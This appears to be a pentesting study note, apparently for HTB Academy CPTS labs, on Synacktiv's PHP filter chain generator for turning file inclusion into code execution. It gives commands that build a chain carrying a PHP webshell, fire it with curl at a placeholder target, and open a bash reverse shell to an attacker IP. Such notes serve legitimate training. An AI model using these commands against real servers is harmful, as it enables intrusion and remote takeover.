# php_filter_chain_generator

**Tags:** #phpfilterchain #LFI #FileInclusion #RCE #PHP #WebAppAttacks #Payloads

Synacktiv's generator for **PHP filter chains** — the technique that turns a plain `include()`-based LFI into RCE with no writable directory, no file upload, no log poisoning, and no `allow_url_include`. It stacks dozens of `convert.iconv.*` conversions so that PHP's own filter pipeline *constructs* your payload byte by byte out of the empty string, then executes it on inclusion. Works on PHP 7.1+.

**Source:** https://github.com/synacktiv/php_filter_chain_generator
**Install:** `git clone https://github.com/synacktiv/php_filter_chain_generator` — single Python script, no dependencies

```bash
# Generate a chain for a webshell payload
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

# Output is a very long php://filter/... string — drop it into the LFI parameter
curl "http://<TARGET>/?file=<CHAIN>&cmd=id"

# Generate and fire in one go
CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -1)
curl -s "http://<TARGET>/?file=${CHAIN}&cmd=id"

# Reverse shell — keep the shell command in the cmd param, not the chain
# ?file=<CHAIN>&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'
```

| Flag | Description |
|---|---|
| `--chain` | The PHP payload to encode into the filter chain |
| `--rawurlencode` | URL-encode the resulting chain (needed for some parameters) |

> [!warning] The sink must be `include()` / `require()`. Against a read-only sink (`file_get_contents`, `readfile`, `fopen`) the chain is returned as inert text — use CVE-2024-2961 / [cnext-exploits](https://github.com/ambionics/cnext-exploits) instead.

> [!note] Generated chains run to several thousand characters. If the target truncates long parameters or sits behind a proxy with a URL length cap, the chain silently fails — test with a short payload like `<?php phpinfo();?>` first to confirm the technique works before blaming the payload.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/File Inclusion|File Inclusion]] — LFI → RCE without a write primitive.

---

*Created: 2026-07-30*
*Updated: 2026-07-30*
*Model: claude-opus-5*
